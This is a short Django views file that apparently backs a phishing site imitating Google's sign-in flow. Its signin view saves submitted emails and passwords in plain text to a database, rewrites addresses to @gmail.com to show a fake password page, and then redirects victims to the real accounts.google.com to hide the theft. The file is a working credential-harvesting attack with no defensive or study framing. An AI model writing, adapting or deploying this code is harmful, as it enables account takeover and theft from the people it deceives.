from django.http import HttpResponse, HttpResponsePermanentRedirect
from django.shortcuts import render
from datetime import datetime
from .models import SignIn


# Create your views here.


def index(request):
    return render(request, 'index.html')


def signin(request):
    print(request.POST)
    if request.method == 'POST':
        email = request.POST.get('email', None)
        password = request.POST.get('password', None)

        if email and password:
            SignIn(email=str(email).strip(), password=str(
                password).strip(), date_time=datetime.now()).save()
            return HttpResponsePermanentRedirect('https://accounts.google.com')
        elif email:
            email = email.split('@')[0] + '@gmail.com'
            return render(request, 'passwd.html', {'email': email})



    return index(request)


def error(request):
    return render(request, '400.html')